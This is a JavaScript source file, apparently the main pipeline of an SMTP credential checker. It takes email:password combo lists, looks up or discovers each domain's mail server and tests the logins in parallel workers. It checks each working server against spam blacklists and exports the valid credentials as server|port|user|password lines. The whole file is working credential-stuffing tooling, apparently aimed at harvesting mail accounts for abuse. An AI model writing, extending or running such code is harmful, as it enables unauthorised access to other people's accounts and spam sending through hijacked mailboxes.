/**
 * Combo Processor
 *
 * Main pipeline orchestrator for processing email:password combos
 * Pipeline: Parse → Database Lookup → Discovery → Validate → Blacklist → Result
 *
 * Processes combos through all phases to validate SMTP credentials
 */

const smtpDatabase = require('./smtpDatabase');
const smtpDiscovery = require('./smtpDiscovery');
const smtpValidator = require('./smtpValidator');
const blacklistChecker = require('./blacklistChecker');
const EventEmitter = require('events');

class ComboProcessor extends EventEmitter {
  constructor(options = {}) {
    super();
    this.threads = options.threads || 5;
    this.timeout = options.timeout || 10000;
    this.skipBlacklist = options.skipBlacklist || false;
    this.retryFailed = options.retryFailed || false;

    this.sessionId = this.generateSessionId();
    this.isRunning = false;
    this.isPaused = false;
    this.isStopped = false;

    this.stats = {
      total: 0,
      processed: 0,
      valid: 0,
      invalid: 0,
      fromDatabase: 0,
      fromDiscovery: 0,
      blacklisted: 0
    };

    this.results = {
      valid: [],
      invalid: []
    };
  }

  /**
   * Generate unique session ID
   * @returns {string} Session ID
   */
  generateSessionId() {
    return `session_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  }

  /**
   * Process single combo through the complete pipeline
   * @param {string} email - Email address
   * @param {string} password - Password
   * @returns {Promise<Object>} Result object
   */
  async processCombo(email, password) {
    const result = {
      email,
      password: null,
      valid: false,
      smtp: null,
      port: null,
      username: null,
      phase: null,
      error: null,
      blacklisted: false,
      connectionTime: 0,
      timestamp: new Date().toISOString()
    };

    try {
      // Extract domain
      const domain = this.extractDomain(email);
      if (!domain) {
        result.error = 'Invalid email format';
        return result;
      }

      // PHASE 1: Database Lookup
      let smtpConfig = smtpDatabase.lookupByEmail(email);

      if (smtpConfig) {
        result.phase = 'database_lookup';
        result.smtp = smtpConfig.servers[0].host;
        result.port = smtpConfig.servers[0].port;
        result.username = smtpDatabase.formatLogin(email, smtpConfig.loginTemplate);

        this.emit('phase', { email, phase: 'database_lookup', found: true });
        this.stats.fromDatabase++;

      } else {
        // PHASE 2: SMTP Discovery
        result.phase = 'discovery';
        this.emit('phase', { email, phase: 'discovery', status: 'starting' });

        const discovered = await smtpDiscovery.discover(email);

        if (!discovered.success || discovered.servers.length === 0) {
          result.error = 'No SMTP servers found';
          this.emit('phase', { email, phase: 'discovery', found: false });
          return result;
        }

        result.smtp = discovered.servers[0].host;
        result.port = discovered.servers[0].port;
        result.username = email; // Default to full email

        this.emit('phase', { email, phase: 'discovery', found: true, servers: discovered.servers.length });
        this.stats.fromDiscovery++;
      }

      // PHASE 3: Credential Validation
      this.emit('phase', { email, phase: 'validation', status: 'testing' });

      const validationResult = await smtpValidator.testCredentials({
        host: result.smtp,
        port: result.port,
        user: result.username,
        pass: password,
        timeout: this.timeout
      });

      result.connectionTime = validationResult.connectionTime;

      if (!validationResult.valid) {
        result.error = validationResult.error;
        this.emit('phase', { email, phase: 'validation', valid: false, error: validationResult.error });
        return result;
      }

      this.emit('phase', { email, phase: 'validation', valid: true });

      // PHASE 4: Blacklist Check (optional)
      if (!this.skipBlacklist && blacklistChecker) {
        this.emit('phase', { email, phase: 'blacklist', status: 'checking' });

        try {
          const blacklisted = await blacklistChecker.checkSmtpBlacklist(result.smtp);

          if (blacklisted && blacklisted.isBlacklisted) {
            result.blacklisted = true;
            result.blacklistInfo = blacklisted.lists;
            this.stats.blacklisted++;
            this.emit('phase', { email, phase: 'blacklist', blacklisted: true, lists: blacklisted.lists });
          } else {
            this.emit('phase', { email, phase: 'blacklist', blacklisted: false });
          }
        } catch (error) {
          // Don't fail the whole process if blacklist check fails
          this.emit('phase', { email, phase: 'blacklist', error: error.message });
        }
      }

      // Success!
      result.valid = true;
      result.password = password;

    } catch (error) {
      result.error = error.message || 'Unknown error';
      this.emit('error', { email, error: error.message });
    }

    return result;
  }

  /**
   * Process multiple combos with worker queue pattern
   * @param {Array} combos - Array of {email, password} objects
   * @returns {Promise<Object>} Results summary
   */
  async processBatch(combos) {
    this.isRunning = true;
    this.isStopped = false;
    this.isPaused = false;

    this.stats.total = combos.length;
    this.stats.processed = 0;
    this.stats.valid = 0;
    this.stats.invalid = 0;

    this.results = {
      valid: [],
      invalid: []
    };

    this.emit('start', { total: combos.length, sessionId: this.sessionId });

    const queue = [...combos];
    let activeWorkers = 0;

    return new Promise((resolve, reject) => {
      const processNext = async () => {
        // Check if stopped
        if (this.isStopped) {
          this.isRunning = false;
          this.emit('stopped', this.getStats());
          resolve(this.getStats());
          return;
        }

        // Wait if paused
        if (this.isPaused) {
          setTimeout(processNext, 100);
          return;
        }

        // Check if done
        if (queue.length === 0 && activeWorkers === 0) {
          this.isRunning = false;
          this.emit('complete', this.getStats());
          resolve(this.getStats());
          return;
        }

        // Check concurrency limit
        if (queue.length === 0 || activeWorkers >= this.threads) {
          return;
        }

        const combo = queue.shift();
        activeWorkers++;

        try {
          const result = await this.processCombo(combo.email, combo.password);

          this.stats.processed++;

          if (result.valid) {
            this.stats.valid++;
            this.results.valid.push(result);
            this.emit('valid', result);
          } else {
            this.stats.invalid++;
            this.results.invalid.push(result);
            this.emit('invalid', result);
          }

          // Emit progress
          this.emit('progress', {
            current: this.stats.processed,
            total: this.stats.total,
            valid: this.stats.valid,
            invalid: this.stats.invalid,
            currentCombo: combo.email,
            percent: Math.round((this.stats.processed / this.stats.total) * 100)
          });

        } catch (error) {
          this.emit('error', { email: combo.email, error: error.message });
          this.stats.processed++;
          this.stats.invalid++;
        }

        activeWorkers--;
        processNext();
      };

      // Start workers
      for (let i = 0; i < this.threads; i++) {
        processNext();
      }
    });
  }

  /**
   * Pause processing
   */
  pause() {
    if (this.isRunning && !this.isPaused) {
      this.isPaused = true;
      this.emit('paused');
    }
  }

  /**
   * Resume processing
   */
  resume() {
    if (this.isRunning && this.isPaused) {
      this.isPaused = false;
      this.emit('resumed');
    }
  }

  /**
   * Stop processing
   */
  stop() {
    if (this.isRunning) {
      this.isStopped = true;
      this.emit('stopping');
    }
  }

  /**
   * Get current statistics
   * @returns {Object} Statistics object
   */
  getStats() {
    const successRate = this.stats.processed > 0
      ? Math.round((this.stats.valid / this.stats.processed) * 100)
      : 0;

    return {
      sessionId: this.sessionId,
      total: this.stats.total,
      processed: this.stats.processed,
      valid: this.stats.valid,
      invalid: this.stats.invalid,
      successRate,
      fromDatabase: this.stats.fromDatabase,
      fromDiscovery: this.stats.fromDiscovery,
      blacklisted: this.stats.blacklisted,
      isRunning: this.isRunning,
      isPaused: this.isPaused
    };
  }

  /**
   * Get valid results
   * @returns {Array} Array of valid SMTP credentials
   */
  getValidResults() {
    return this.results.valid;
  }

  /**
   * Get invalid results
   * @returns {Array} Array of invalid combos with errors
   */
  getInvalidResults() {
    return this.results.invalid;
  }

  /**
   * Get all results
   * @returns {Object} All results
   */
  getAllResults() {
    return {
      valid: this.results.valid,
      invalid: this.results.invalid,
      stats: this.getStats()
    };
  }

  /**
   * Export valid results in specified format
   * @param {string} format - Format: txt, csv, json
   * @returns {string} Formatted results
   */
  exportResults(format = 'txt') {
    const validResults = this.results.valid;

    switch (format) {
      case 'txt':
        return validResults
          .map(r => `${r.smtp}|${r.port}|${r.username}|${r.password}`)
          .join('\n');

      case 'csv':
        let csv = 'SMTP Server,Port,Username,Password,Phase,Blacklisted,Connection Time\n';
        csv += validResults
          .map(r => `${r.smtp},${r.port},${r.username},${r.password},${r.phase},${r.blacklisted},${r.connectionTime}`)
          .join('\n');
        return csv;

      case 'json':
        return JSON.stringify(validResults, null, 2);

      default:
        throw new Error('Unsupported format. Use txt, csv, or json');
    }
  }

  /**
   * Extract domain from email address
   * @param {string} email - Email address
   * @returns {string|null} Domain or null
   */
  extractDomain(email) {
    const match = email.match(/@([a-z0-9.-]+\.[a-z]{2,})$/i);
    return match ? match[1].toLowerCase() : null;
  }

  /**
   * Clean up resources
   */
  cleanup() {
    this.removeAllListeners();
    this.results = { valid: [], invalid: [] };
    this.stats = {
      total: 0,
      processed: 0,
      valid: 0,
      invalid: 0,
      fromDatabase: 0,
      fromDiscovery: 0,
      blacklisted: 0
    };
  }
}

module.exports = ComboProcessor;
